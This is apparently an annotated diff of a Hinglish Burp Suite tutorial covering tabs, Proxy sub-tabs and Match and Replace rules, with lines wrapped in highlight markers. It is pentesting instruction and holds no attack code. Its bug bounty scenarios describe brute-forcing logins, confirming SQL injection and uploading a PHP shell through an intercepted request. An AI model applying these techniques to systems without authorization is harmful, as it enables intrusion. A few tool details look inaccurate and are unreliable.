 
 ### 🌍 11. Real-World Use Case (Bug Bounty / Pentesting)
 
-**Scenario:** Ek bug bounty hunter ne ek website test kiya. Usne **Proxy** se traffic intercept kiya aur dekha ki login request POST mein ja rahi thi. Usne request ko **Repeater** mein bheja aur parameter values change karke dekhna shuru kiya. Phir usne **Intruder** mein bheja (slow speed mein) common passwords ki list lagai. Kuch attempts ke baad response mein error message aaya jo SQL Injection ka hint de raha tha. Usne **Decoder** mein payload encode kiya aur wapas Repeater mein try kiya. Finally SQL Injection confirm hua. Usne **Comparer** mein do responses compare kiye (valid vs invalid) to confirm.  
-**Result:** Report likhi, bounty $750 mila.  
-**Lesson:** Ek vulnerability find karne ke liye multiple tabs ka combination use karna padta hai.
+[[HL::**Scenario:** Ek bug bounty hunter ne ek website test kiya. Usne **Proxy** se traffic intercept kiya aur dekha ki login request POST mein ja rahi thi. Usne request ko **Repeater** mein bheja aur parameter values change karke dekhna shuru kiya. Phir usne **Intruder** mein bheja (slow speed mein) common passwords ki list lagai. Kuch attempts ke baad response mein error message aaya jo SQL Injection ka hint de raha tha. Usne **Decoder** mein payload encode kiya aur wapas Repeater mein try kiya. Finally SQL Injection confirm hua. Usne **Comparer** mein do responses compare kiye (valid vs invalid) to confirm.::HL]]  
+[[HL::**Result:** Report likhi, bounty $750 mila.::HL]]  
+[[HL::**Lesson:** Ek vulnerability find karne ke liye multiple tabs ka combination use karna padta hai::HL]].
 
 ---
 
@@ -1444,12 +1444,12 @@ Har tab internally Burp Suite ke core engine se juda hai:
 
 - **Target scope set karo:** Target → Scope mein apni target domain add karo. Phir Proxy options mein "Force use of TLS" aur "Don't send items to scope" jaise settings set kar sakte ho.
 
-- **Filters use karo:** Proxy history mein filter laga kar sirf scope ki requests dekh sakte ho, images/CSS hide kar sakte ho.
+- [[HL::**Filters use karo:** Proxy history mein filter laga kar sirf scope ki requests dekh sakte ho, images/CSS hide kar sakte ho::HL]].
 
-- **Extensions install karo:** Extender → BApp Store mein jao aur useful extensions install karo:
-    - **JSON Beautifier:** JSON response ko readable banata hai.
-    - **Hackvector:** Intruder payloads mein help karta hai.
-    - **Turbo Intruder:** Python-based fast intruder (advanced).
+- [[HL::**Extensions install karo:** Extender → BApp Store mein jao aur useful extensions install karo:::HL]]
+    - [[HL::**JSON Beautifier:** JSON response ko readable banata hai.::HL]]
+    - [[HL::**Hackvector:** Intruder payloads mein help karta hai.::HL]]
+    - [[HL::**Turbo Intruder:** Python-based fast intruder (advanced::HL]]).
 
 - **Dark theme use karo:** User Options → Display mein theme Dark rakho – aankhon ko sukoon milta hai.
 
@@ -1461,7 +1461,7 @@ Har tab internally Burp Suite ke core engine se juda hai:
 
 - **Agar tabs ka use nahi samjhe:** Tum Burp Suite ka 10% bhi use nahi kar paoge. Sirf proxy use karoge, baaki features waste.
 
-- **Agar target scope set nahi kiya:** Tumhari history mein bahut saari irrelevant requests (ads, trackers, etc.) aa jayengi, important requests dhundhna mushkil ho jayega.
+- [[HL::**Agar target scope set nahi kiya:** Tumhari history mein bahut saari irrelevant requests (ads, trackers, etc.) aa jayengi, important requests dhundhna mushkil ho jayega::HL]].
 
 - **Agar Intruder ka misuse kiya:** Slow speed ke bawajood agar bahut heavy payload list daal di to Burp hang ho sakta hai. Community edition mein to aur bhi slow hai, patience rakho.
 
@@ -1481,11 +1481,11 @@ A1: Main tabs hain – Dashboard, Target, Proxy, Intruder, Repeater, Sequencer, 
 **Q2: Proxy tab ka kya use hai?**  
 A2: Browser aur server ke beech mein traffic intercept karna, dekhna, modify karna, aur history record karna.
 
-**Q3: Intruder aur Repeater mein kya antar hai?**  
-A3: Repeater manual single request modify kar ke bhejne ke liye, Intruder automated multiple requests (brute force, fuzzing) ke liye.
+[[HL::**Q3: Intruder aur Repeater mein kya antar hai?**::HL]]  
+[[HL::A3: Repeater manual single request modify kar ke bhejne ke liye, Intruder automated multiple requests (brute force, fuzzing) ke liye::HL]].
 
-**Q4: Decoder tab mein kaunsa encoding/decoding available hai?**  
-A4: URL, HTML, Base64, ASCII hex, ASCII octal, Gzip, etc. Smart decode bhi hai.
+[[HL::**Q4: Decoder tab mein kaunsa encoding/decoding available hai?**::HL]]  
+[[HL::A4: URL, HTML, Base64, ASCII hex, ASCII octal, Gzip, etc. Smart decode bhi hai::HL]].
 
 **Q5: Extender tab kya hai?**  
 A5: Burp Suite mein functionality add karne ke liye. BApp store se extensions install kar sakte ho (Python, Ruby, etc. through Jython/JRuby).
@@ -1543,20 +1543,20 @@ Socho tum ek **mall ke security checkpost** par ho. Mall ke andar jaane se pehle
 - **Options:** Mall management ne kuch rules bana rakhe hain - "Sirf red bag walo ko rokna", "X-ray machine ko aise set karo", "Emergency exit ka kya karna hai". Ye saare settings **Options** mein define hote hain.
 
 ## 📖 3. Technical Definition (Interview Answer):
-Proxy module ke ye chaar sections hain jo Burp Suite aur target web server ke beech hone wale saare interaction ko control, record, aur modify karte hain.
+[[HL::Proxy module ke ye chaar sections hain jo Burp Suite aur target web server ke beech hone wale saare interaction ko control, record, aur modify karte hain.::HL]]
 
-- **Intercept:** Ek real-time traffic controller hai. Tum iska use karke browser aur server ke beech jaane wali har request (jaise "mujhe Facebook ka homepage chahiye") aur response (Facebook ka "ye lo homepage ka code") ko rok sakte ho, dekh sakte ho, badal sakte ho, aur phir aage bhej sakte ho.
-- **HTTP History:** Ek detailed logbook hai. Jab bhi tum koi website visit karte ho, uski saari information (URL, time, request type, server ka response code) yahan automatically save ho jaati hai. Tum baad mein ise dekh kar analysis kar sakte ho.
-- **WebSockets History:** Jab koi website real-time updates bhejti hai (jaise live cricket score ya chat message) to wo WebSockets technology use karti hai. Jo bhi real-time message aata-jata hai, uska record yahan store hota hai.
-- **Options:** Proxy server ki settings ka control panel hai. Yahan tum define kar sakte ho ki proxy kis port par sunega, kaunsa traffic intercept karna hai, automatically kya replace karna hai, etc.
+- [[HL::**Intercept:** Ek real-time traffic controller hai. Tum iska use karke browser aur server ke beech jaane wali har request (jaise "mujhe Facebook ka homepage chahiye") aur response (Facebook ka "ye lo homepage ka code") ko rok sakte ho, dekh sakte ho, badal sakte ho, aur phir aage bhej sakte ho.::HL]]
+- [[HL::**HTTP History:** Ek detailed logbook hai. Jab bhi tum koi website visit karte ho, uski saari information (URL, time, request type, server ka response code) yahan automatically save ho jaati hai. Tum baad mein ise dekh kar analysis kar sakte ho.::HL]]
+- [[HL::**WebSockets History:** Jab koi website real-time updates bhejti hai (jaise live cricket score ya chat message) to wo WebSockets technology use karti hai. Jo bhi real-time message aata-jata hai, uska record yahan store hota hai::HL]].
+- [[HL::**Options:** Proxy server ki settings ka control panel hai. Yahan tum define kar sakte ho ki proxy kis port par sunega, kaunsa traffic intercept karna hai, automatically kya replace karna hai, etc::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 - **Problem:** Agar tumhe kisi website ki security check karni hai, toh tumhe ye dekhna hoga ki browser server ko kya bhej raha hai aur server browser ko kya wapas bhej raha hai. Bina iske tum "blind" ho. Tum sirf website ka final result dekhoge, andar ka communication nahi.
 - **Solution:** Proxy sections tumhe ye **transparency** dete hain. Tum har chhoti se chhoti cheez ko rok kar, record karke, modify karke dekh sakte ho ki server ka reaction kya hota hai. Isse tum vulnerabilities (kamzoriyan) dhundh sakte ho jo normally dikhti nahi.
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Burp Suite window ke top par ek row of tabs hoti hai (Target, Proxy, Intruder, etc.). **"Proxy"** tab par click karo.
-- **Appearance:** Click karne par neeche 4 aur sub-tabs dikhenge: **Intercept, HTTP History, WebSockets History, Options**. Yeh sub-tabs ek saath line mein hote hain.
+- [[HL::**Location:** Burp Suite window ke top par ek row of tabs hoti hai (Target, Proxy, Intruder, etc.). **"Proxy"** tab par click karo.::HL]]
+- [[HL::**Appearance:** Click karne par neeche 4 aur sub-tabs dikhenge: **Intercept, HTTP History, WebSockets History, Options**. Yeh sub-tabs ek saath line mein hote hain::HL]].
 
     ```
     [Proxy]
@@ -1574,16 +1574,16 @@ Har section ka internal working kuch is tarah hai:
     - Step 5: Jab tum "Forward" button dabate ho, tab Burp ye (modified) request actual server ko bhejta hai.
     - Step 6: Server ka response wapas aata hai. Burp us response ko bhi rok kar tumhe dikha sakta hai (agar "Intercept responses" option on ho).
 
-2.  **HTTP History:**
-    - Step 1: Har request jo Proxy se guzarti hai (chahe woh Intercept hui ho ya nahi), uska ek entry banta hai.
-    - Step 2: Ye entry HTTP History table mein add ho jaata hai jisme columns hote hain: #, Host, Method, URL, Params, Status, Length, MIME type, etc.
+2.  [[HL::**HTTP History:**::HL]]
+    - [[HL::Step 1: Har request jo Proxy se guzarti hai (chahe woh Intercept hui ho ya nahi), uska ek entry banta hai.::HL]]
+    - [[HL::Step 2: Ye entry HTTP History table mein add ho jaata hai jisme columns hote hain: #, Host, Method, URL, Params, Status, Length, MIME type, etc::HL]].
 
 3.  **WebSockets History:**
-    - Step 1: Jab browser aur server WebSocket connection establish karte hain, Burp use detect kar leta hai.
-    - Step 2: Connection par aane wala aur jaane wala har message yahan log ho jaata hai.
+    - [[HL::Step 1: Jab browser aur server WebSocket connection establish karte hain, Burp use detect kar leta hai.::HL]]
+    - [[HL::Step 2: Connection par aane wala aur jaane wala har message yahan log ho jaata hai::HL]].
 
-4.  **Options:**
-    - Ye settings proxy ke behavior ko control karte hain. Jab Burp start hota hai, ye settings padhi jaati hain aur Proxy us hisaab se kaam karta hai.
+4.  **[[HL::Options::HL]]:**
+    - [[HL::Ye settings proxy ke behavior ko control karte hain. Jab Burp start hota hai, ye settings padhi jaati hain aur Proxy us hisaab se kaam karta hai::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
 Chalo, ab hum asli mein dekhte hain.
@@ -1595,22 +1595,22 @@ Chalo, ab hum asli mein dekhte hain.
 4.  **Expected Screen:** Ab Burp Suite mein tumhe ek request dikhegi kuch aisi:
 
     ```http
-    GET / HTTP/1.1
-    Host: example.com
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-    ... (aur bhi lines)
+    [[HL::GET / HTTP/1.1::HL]]
+    [[HL::Host: example.com::HL]]
+    [[HL::User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0::HL]]
+    [[HL::Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8::HL]]
+    [[HL::... (aur bhi lines)::HL]]
     ```
-    *Yeh request browser ne server ko bheji thi. Burp ne ise rok liya.*
+    *[[HL::Yeh request browser ne server ko bheji thi. Burp ne ise rok liya.::HL]]*
 
-5.  Tum is request mein kuch bhi change kar sakte ho. Jaise `GET` ko `POST` kar do. Ya koi naya line add kar do.
-6.  Ab **"Forward"** button dabao. Ye request ab server ko chali jayegi.
-7.  Tum **"Drop"** bhi dabaa sakte ho, jisse request cancel ho jayegi aur server tak nahi pahunchegi.
+5.  [[HL::Tum is request mein kuch bhi change kar sakte ho. Jaise `GET` ko `POST` kar do. Ya koi naya line add kar do.::HL]]
+6.  [[HL::Ab **"Forward"** button dabao. Ye request ab server ko chali jayegi.::HL]]
+7.  [[HL::Tum **"Drop"** bhi dabaa sakte ho, jisse request cancel ho jayegi aur server tak nahi pahunchegi.::HL]]
 
-**Step 2: HTTP History Dekhna**
-1.  **Proxy → HTTP History** par jao.
-2.  **Expected Screen:** Tumhe ek table dikhega jisme saari requests ki list hogi jo abhi tak hui hain. Jaise tumne `example.com` khola, uska bhi yahan ek entry hogi.
-3.  Kisi bhi entry par click karo. Neeche do pane honge: **Request** aur **Response**. Yahan tum dekh sakte ho ki actual mein kya bheja gaya aur kya wapas aaya.
+[[HL::**Step 2: HTTP History Dekhna**::HL]]
+1.  [[HL::**Proxy → HTTP History** par jao.::HL]]
+2.  [[HL::**Expected Screen:** Tumhe ek table dikhega jisme saari requests ki list hogi jo abhi tak hui hain. Jaise tumne `example.com` khola, uska bhi yahan ek entry hogi.::HL]]
+3.  [[HL::Kisi bhi entry par click karo. Neeche do pane honge: **Request** aur **Response**. Yahan tum dekh sakte ho ki actual mein kya bheja gaya aur kya wapas aaya::HL]].
 
 ## ⚖️ 8. Comparison (Ye vs Woh):
 | Feature | Intercept | HTTP History |
@@ -1624,20 +1624,20 @@ Chalo, ab hum asli mein dekhte hain.
 - **Mistake 1: Intercept on bhool jaana.**
     - **Scenario:** Tumne "Intercept is on" kiya, request roki, modify kiya, but phir "Forward" dabana bhool gaye. Browser ghooma hi rahega, loading... loading...
     - **Fix:** Jab kaam ho jaye, ya to "Forward" dabao, ya "Intercept is off" kar do taaki saara traffic normal flow ho.
-- **Mistake 2: HTTP History mein bhoolna ki kaunsa request kaunsa hai.**
-    - **Fix:** History mein # column hota hai. Tum apne kaam ke hisaab se requests ko comment bhi kar sakte ho (right-click → Add comment).
-- **Mistake 3: WebSockets History ko ignore karna.**
-    - **Fix:** Aaj kal almost har modern site (Gmail, Facebook, WhatsApp Web) WebSockets use karti hai. Agar tum wahan vulnerabilities dhundh rahe ho, to is tab ko check karna mat bhoolna.
+- [[HL::**Mistake 2: HTTP History mein bhoolna ki kaunsa request kaunsa hai.**::HL]]
+    - [[HL::**Fix:** History mein # column hota hai. Tum apne kaam ke hisaab se requests ko comment bhi kar sakte ho (right-click → Add comment::HL]]).
+- [[HL::**Mistake 3: WebSockets History ko ignore karna.**::HL]]
+    - [[HL::**Fix:** Aaj kal almost har modern site (Gmail, Facebook, WhatsApp Web) WebSockets use karti hai. Agar tum wahan vulnerabilities dhundh rahe ho, to is tab ko check karna mat bhoolna::HL]].
 
 ## 🤔 10. Agar Dimag Ghoom Rahe Hai? (Confusion Clarifier):
 - **"Log sochte hain ki... HTTP History mein saari requests dikhti hain jo maine browser mein ki, lekin kuch requests yahan nahi dikhti."**
     - **Actually, aisa nahi hai...** Burp Proxy sirf unhi requests ko record karta hai jo uske through aati hain. Agar tumne browser ka proxy setting nahi kiya, ya browser Burp ki taraf point nahi kiya, to koi request history mein nahi aayegi. Ya agar site HTTPS use kar rahi hai aur tumne Burp ka certificate install nahi kiya, to bhi encrypted traffic nahi dikhega.
-- **"Log sochte hain ki... Intercept ka matlab hai sirf request rokna."**
-    - **Actually, aisa nahi hai...** Intercept se tum **response** bhi rok sakte ho! Options mein jakar "Intercept responses based on the following rules" enable karo. Fir server se aata hua response bhi tum modify kar sakte ho, jo client-side logic bypass karne ke kaam aata hai.
+- **"[[HL::Log sochte hain ki... Intercept ka matlab hai sirf request rokna."::HL]]**
+    - [[HL::**Actually, aisa nahi hai...** Intercept se tum **response** bhi rok sakte ho! Options mein jakar "Intercept responses based on the following rules" enable karo. Fir server se aata hua response bhi tum modify kar sakte ho, jo client-side logic bypass karne ke kaam aata hai::HL]].
 
 ## 🌍 11. Real-World Use Case (Bug Bounty / Pentesting):
 - **Scenario:** Ek bug bounty program mein ek website thi jahan user apna profile update kar sakta tha. Profile picture upload karte time server sirf client-side (browser wali) JavaScript check kar raha tha ki file `.jpg` hai ya nahi.
-- **How they used it:** Pentester ne Intercept mode on kiya. Profile picture upload karte time jo request gayi (`POST /update-profile`), usko rok liya. Usne dekha ki request mein `filename="myprofile.jpg"` likha tha. Usne ise badal diya `filename="shell.php"` aur file ke content ko bhi PHP code se replace kar diya.
+- [[HL::**How they used it:** Pentester ne Intercept mode on kiya. Profile picture upload karte time jo request gayi (`POST /update-profile`), usko rok liya. Usne dekha ki request mein `filename="myprofile.jpg"` likha tha. Usne ise badal diya `filename="shell.php"` aur file ke content ko bhi PHP code se replace kar diya::HL]].
 - **Result:** Server ne request ko process kar liya kyunki usne server-side validation nahi ki thi. Pentester ne server par shell (malicious file) upload kar di. Is vulnerability ko **Unrestricted File Upload** kehte hain, aur bounty $1,000 mila.
 
 ## 🎨 12. Visual Diagram (ASCII Art):
@@ -1658,21 +1658,21 @@ Chalo, ab hum asli mein dekhte hain.
 ````
 
 ## 🛠️ 13. Best Practices (Pro Tips):
-- **Tip 1 (Scope Set Karo):** Target tab mein jakar apne testing website ka "scope" set karo. Proxy → Options → "Intercept Client Requests" mein rule bana do ki sirf "in-scope" items ko intercept karo. Isse Facebook ya Google ki unwanted traffic nahi rukegi aur tumhara kaam asaan hoga.
-- **Tip 2 (Comments in History):** HTTP History mein jab tum koi interesting request dekho, toh turant right-click kar ke "Add Comment" se uska note likh do, jaise "ye vulnerable lag raha hai". Baad mein analysis mein madad milegi.
-- **Tip 3 (WebSockets ko Monitor Karo):** Jab tum koi modern web app test karo, to WebSockets History tab ko khol ke rakho. Kuch vulnerabilities (jaise command injection) yahan se trigger ho sakti hain.
+- [[HL::**Tip 1 (Scope Set Karo):** Target tab mein jakar apne testing website ka "scope" set karo. Proxy → Options → "Intercept Client Requests" mein rule bana do ki sirf "in-scope" items ko intercept karo. Isse Facebook ya Google ki unwanted traffic nahi rukegi aur tumhara kaam asaan hoga::HL]].
+- [[HL::**Tip 2 (Comments in History):** HTTP History mein jab tum koi interesting request dekho, toh turant right-click kar ke "Add Comment" se uska note likh do, jaise "ye vulnerable lag raha hai". Baad mein analysis mein madad milegi::HL]].
+- [[HL::**Tip 3 (WebSockets ko Monitor Karo):** Jab tum koi modern web app test karo, to WebSockets History tab ko khol ke rakho. Kuch vulnerabilities (jaise command injection) yahan se trigger ho sakti hain::HL]].
 
 ## ⚠️ 14. Consequences of Failure (Agar galat kiya toh?):
 - **Scenario 1 (Intercept bhoolna):** Tumne Intercept on kiya, request roki, aur coffee peene chale gaye. Browser ka ek important request atka raha. Website hang ho sakti hai ya session timeout ho sakta hai.
 - **Scenario 2 (History clear na karna):** Tum ek client ki site test kar rahe ho, aur pehle tumne apni Gmail check ki thi. HTTP History mein Gmail ki entry reh gayi. Ab tum client ko screenshot bhejoge to unhe tumhari personal information dikh sakti hai. Hamesha test start karne se pehle history clear kar lo.
 
 ## ❓ 15. FAQ (Interview Questions):
-- **Q1: Burp Proxy mein Intercept aur HTTP History mein kya antar hai?**
-    - **A1:** Intercept live traffic ko real-time rokta hai jisse tum modify kar sakte ho, jabki HTTP History already pass ho chuke traffic ka record hai, analysis ke liye.
-- **Q2: Agar maine browser mein proxy set kiya aur Burp mein "Intercept is off" hai, to kya request HTTP History mein dikhegi?**
-    - **A2:** Haan, bilkul. "Intercept is off" hone ka matlab hai ki Burp traffic ko bina roke aage bhej raha hai, lekin uska record (log) zaroor bana raha hai, jo HTTP History mein dikhega.
-- **Q3: WebSockets History kyun important hai?**
-    - **A3:** Kyunki aaj kal real-time applications (chat, gaming, live feeds) WebSockets use karte hain. Agar tumhe in applications ko test karna hai, to yahan tum messages dekh kar unme injection attacks kar sakte ho.
+- [[HL::**Q1: Burp Proxy mein Intercept aur HTTP History mein kya antar hai?**::HL]]
+    - [[HL::**A1:** Intercept live traffic ko real-time rokta hai jisse tum modify kar sakte ho, jabki HTTP History already pass ho chuke traffic ka record hai, analysis ke liye::HL]].
+- [[HL::**Q2: Agar maine browser mein proxy set kiya aur Burp mein "Intercept is off" hai, to kya request HTTP History mein dikhegi?**::HL]]
+    - [[HL::**A2:** Haan, bilkul. "Intercept is off" hone ka matlab hai ki Burp traffic ko bina roke aage bhej raha hai, lekin uska record (log) zaroor bana raha hai, jo HTTP History mein dikhega::HL]].
+- [[HL::**Q3: WebSockets History kyun important hai?**::HL]]
+    - [[HL::**A3:** Kyunki aaj kal real-time applications (chat, gaming, live feeds) WebSockets use karte hain. Agar tumhe in applications ko test karna hai, to yahan tum messages dekh kar unme injection attacks kar sakte ho::HL]].
 - **Q4: Burp Proxy ka default port kya hota hai?**
     - **A4:** Default port `8080` hota hai. Tum ise Options → Proxy Listeners mein change kar sakte ho.
 - **Q5: Agar main HTTPS site visit kar raha hoon to Burp mein kuch kyun nahi dikh raha?**
@@ -1815,89 +1815,89 @@ With Setting (true):
 Socho tum ek **dabba (parcel)** bhej rahe ho jisme "Kela" likha hai. Har baar jab tum parcel bhejo, tumhe uspar "Kela" likhna padta hai. Lekin tum chahte ho ki parcel par hamesha "Seb" likha jaaye. Tum ek **stamp** bana sakte ho jo apne aap "Kela" ko dhundh kar "Seb" se replace kar de, har parcel par. Burp Suite ka **Match and Replace** exactly yahi kaam karta hai. Tum ek rule bana dete ho ki jab bhi request mein "Kela" dikhe, use turant "Seb" mein badal do. Bina tumhare manually change kiye.
 
 ## 📖 3. Technical Definition (Interview Answer):
-Burp Proxy ka **Match and Replace** feature hai jo automatically incoming requests aur outgoing responses ko modify karta hai, predefined rules ke based pe. Ye client-server ke beech mein baitha ek automatic editor hai. Tum kisi bhi string ya pattern ko dhundh sakte ho aur use kisi aur string se replace kar sakte ho. Ye modification **on-the-fly** hota hai, matlab jaise hi traffic guzrega, change ho jayega.
+[[HL::Burp Proxy ka **Match and Replace** feature hai jo automatically incoming requests aur outgoing responses ko modify karta hai, predefined rules ke based pe. Ye client-server ke beech mein baitha ek automatic editor hai. Tum kisi bhi string ya pattern ko dhundh sakte ho aur use kisi aur string se replace kar sakte ho. Ye modification **on-the-fly** hota hai, matlab jaise hi traffic guzrega, change ho jayega::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem:** Maan lo tum ek website test kar rahe ho jahan tumhe har request mein apna ek custom header (jaise `X-Test: True`) daalna hai. Ya tumhe har response mein se ek annoying message (jaise `Powered by XYZ`) hata dena hai. Agar tum manually har request ko Intercept karke karo ge, to bahut time lagega aur galti hone ka chance rahega.
-- **Solution:** Match and Replace is repetitive kaam ko **automate** kar deta hai. Tum ek baar rule bana do, aur Burp apne aap saari future requests/responses mein ye change kar dega. Isse time bachta hai aur consistency aati hai.
+- [[HL::**Problem:** Maan lo tum ek website test kar rahe ho jahan tumhe har request mein apna ek custom header (jaise `X-Test: True`) daalna hai. Ya tumhe har response mein se ek annoying message (jaise `Powered by XYZ`) hata dena hai. Agar tum manually har request ko Intercept karke karo ge, to bahut time lagega aur galti hone ka chance rahega.::HL]]
+- [[HL::**Solution:** Match and Replace is repetitive kaam ko **automate** kar deta hai. Tum ek baar rule bana do, aur Burp apne aap saari future requests/responses mein ye change kar dega. Isse time bachta hai aur consistency aati hai::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Burp Suite mein **Proxy** tab ke andar **Options** sub-tab par jao. Neeche scroll karo jab tak **"Match and Replace"** dikhe.
-- **Appearance:** Tumhe ek table dikhega jisme kuch predefined rules honge (jaise "Remove JavaScript" etc). Table ke neeche **"Add"** aur **"Remove"** jaise buttons honge.
+- [[HL::**Location:** Burp Suite mein **Proxy** tab ke andar **Options** sub-tab par jao. Neeche scroll karo jab tak **"Match and Replace"** dikhe.::HL]]
+- [[HL::**Appearance:** Tumhe ek table dikhega jisme kuch predefined rules honge (jaise "Remove JavaScript" etc). Table ke neeche **"Add"** aur **"Remove"** jaise buttons honge::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1.  **Rule Definition:** Tum Proxy → Options → Match and Replace mein jaakar ek naya rule add karte ho. Rule mein tum batate ho ki:
-    - Type: Request mein badalna hai ya Response mein.
-    - Match: Kaunsa text dhundhna hai (e.g., `User-Agent: Firefox`).
-    - Replace: Kis text se badalna hai (e.g., `User-Agent: Chrome`).
-    - Regex: Agar tum complex pattern dhundhna chahte ho (jaise koi bhi number), to regex use kar sakte ho.
-2.  **Rule Enable:** Rule ko on karte ho (checkbox tick).
-3.  **Traffic Interception:** Jab koi request ya response Proxy se guzarta hai, Burp sabse pehle check karta hai ki kaun se Match and Replace rules enable hain.
-4.  **Pattern Matching and Replacement:** Burp traffic ke andar (headers, body) mein jaakar tumhare diye gaye "Match" pattern ko dhundhta hai. Jaise hi pattern milta hai, use turant "Replace" waale text se badal diya jata hai.
-5.  **Forwarding:** Modified traffic ko aage (client ya server) ki taraf bhej diya jata hai.
+1.  [[HL::**Rule Definition:** Tum Proxy → Options → Match and Replace mein jaakar ek naya rule add karte ho. Rule mein tum batate ho ki:::HL]]
+    - [[HL::Type: Request mein badalna hai ya Response mein.::HL]]
+    - [[HL::Match: Kaunsa text dhundhna hai (e.g., `User-Agent: Firefox`).::HL]]
+    - [[HL::Replace: Kis text se badalna hai (e.g., `User-Agent: Chrome`).::HL]]
+    - [[HL::Regex: Agar tum complex pattern dhundhna chahte ho (jaise koi bhi number), to regex use kar sakte ho::HL]].
+2.  [[HL::**Rule Enable:** Rule ko on karte ho (checkbox tick).::HL]]
+3.  [[HL::**Traffic Interception:** Jab koi request ya response Proxy se guzarta hai, Burp sabse pehle check karta hai ki kaun se Match and Replace rules enable hain.::HL]]
+4.  [[HL::**Pattern Matching and Replacement:** Burp traffic ke andar (headers, body) mein jaakar tumhare diye gaye "Match" pattern ko dhundhta hai. Jaise hi pattern milta hai, use turant "Replace" waale text se badal diya jata hai.::HL]]
+5.  [[HL::**Forwarding:** Modified traffic ko aage (client ya server) ki taraf bhej diya jata hai::HL]].
 
 ## 💻 7. Hands-On: Step-by-Step Practical (CRITICAL SECTION):
-Chalo, ek rule banate hain jo har request mein ek custom header add karega.
+[[HL::Chalo, ek rule banate hain jo har request mein ek custom header add karega.::HL]]
 
-**Step 1: Match and Replace settings mein jao**
+[[HL::**Step 1: Match and Replace settings mein jao**::HL]]
 ```text
-Burp Suite mein Proxy tab par click karo.
-Phir neeche Options sub-tab par click karo.
-Neeche scroll karo jab tak "Match and Replace" section na dikh jaye.
+[[HL::Burp Suite mein Proxy tab par click karo.::HL]]
+[[HL::Phir neeche Options sub-tab par click karo.::HL]]
+[[HL::Neeche scroll karo jab tak "Match and Replace" section na dikh jaye.::HL]]
 ```
-**Expected Screen:** Ek table jisme kuch rules already honge (jaise "User-Agent", "Referer" etc). Unke aage checkbox honge.
+[[HL::**Expected Screen:** Ek table jisme kuch rules already honge (jaise "User-Agent", "Referer" etc). Unke aage checkbox honge.::HL]]
 
-**Step 2: Naya rule add karo**
+[[HL::**Step 2: Naya rule add karo**::HL]]
 ```text
-"Add" button par CLICK karo.
+[[HL::"Add" button par CLICK karo::HL]].
 ```
-**Expected Screen:** Ek naya window khulega jiska naam hoga "Match / Replace Rule".
+[[HL::**Expected Screen:** Ek naya window khulega jiska naam hoga "Match / Replace Rule".::HL]]
 
-**Step 3: Rule ki details bharein**
-Is window mein hum kuch fields bharenge.
+[[HL::**Step 3: Rule ki details bharein**::HL]]
+[[HL::Is window mein hum kuch fields bharenge.::HL]]
 
-- **Type:** Dropdown se "Request header" select karo (kyunki hum header modify kar rahe hain).
-- **Match:** Isme hum wo pattern dalenge jise dhundhna hai. Hum ek aisa header add karna chahte hain jo shayad already exist nahi karta. Toh hum kuch aisa match kar sakte hain jo har request mein hota hai, jaase `\r\n\r\n`. Lekin ye advanced hai. Ek simple tarika: hum ek naya header add kar sakte hain. Lekin rule ye hota hai ki agar match nahi milta to replacement nahi hota. Toh naya header add karne ke liye hum ek aise pattern ko match karenge jo header section ke end mein hota hai. Lekin beginners ke liye asaan tarika ye hai ki hum kisi existing header ko replace karein.
+- [[HL::**Type:** Dropdown se "Request header" select karo (kyunki hum header modify kar rahe hain).::HL]]
+- [[HL::**Match:** Isme hum wo pattern dalenge jise dhundhna hai. Hum ek aisa header add karna chahte hain jo shayad already exist nahi karta. Toh hum kuch aisa match kar sakte hain jo har request mein hota hai, jaase `\r\n\r\n`. Lekin ye advanced hai. Ek simple tarika: hum ek naya header add kar sakte hain. Lekin rule ye hota hai ki agar match nahi milta to replacement nahi hota. Toh naya header add karne ke liye hum ek aise pattern ko match karenge jo header section ke end mein hota hai. Lekin beginners ke liye asaan tarika ye hai ki hum kisi existing header ko replace karein.::HL]]
 
-    **Asaan Tarika:** Maan lo hum har request ka `User-Agent` badal kar `HackerOne` karna chahte hain.
+    [[HL::**Asaan Tarika:** Maan lo hum har request ka `User-Agent` badal kar `HackerOne` karna chahte hain.::HL]]
 
-    - **Match:** `^User-Agent:.*$`  (iska matlab: line jo "User-Agent:" se shuru hoti hai aur kuch bhi ho sakta hai).
-    - **Replace:** `User-Agent: HackerOne` (ye naya header ban jayega).
+    - [[HL::**Match:** `^User-Agent:.*$`  (iska matlab: line jo "User-Agent:" se shuru hoti hai aur kuch bhi ho sakta hai).::HL]]
+    - [[HL::**Replace:** `User-Agent: HackerOne` (ye naya header ban jayega).::HL]]
 
-    Ya phir hum koi bhi aisa header choose kar sakte hain jo almost har request mein hota hai, jaise `Accept`.
+    [[HL::Ya phir hum koi bhi aisa header choose kar sakte hain jo almost har request mein hota hai, jaise `Accept`.::HL]]
 
-    Lekin ek aur simple trick: Tum ek naya header **add** kar sakte ho bina kuch replace kiye. Iske liye ek special pattern hai: `$^` (empty string).
+    [[HL::Lekin ek aur simple trick: Tum ek naya header **add** kar sakte ho bina kuch replace kiye. Iske liye ek special pattern hai: `$^` (empty string).::HL]]
 
-    **Naya Header Add Karne Ka Tarika:**
-    - **Type:** Request header
-    - **Match:** `$^`  (iska matlab: line ke start se pehle, yaani bilkul shuruat)
-    - **Replace:** `X-My-Custom-Header: HelloWorld\n`  (yaani ek naya header aur newline add kar do)
+    [[HL::**Naya Header Add Karne Ka Tarika:**::HL]]
+    - [[HL::**Type:** Request header::HL]]
+    - [[HL::**Match:** `$^`  (iska matlab: line ke start se pehle, yaani bilkul shuruat)::HL]]
+    - [[HL::**Replace:** `X-My-Custom-Header: HelloWorld\n`  (yaani ek naya header aur newline add kar do)::HL]]
 
-    Chalo ye try karte hain.
-- **Regex:** Is checkbox ko tick kar do kyunki `$^` ek regex pattern hai.
-- **Enabled:** Checkbox tick rahne do.
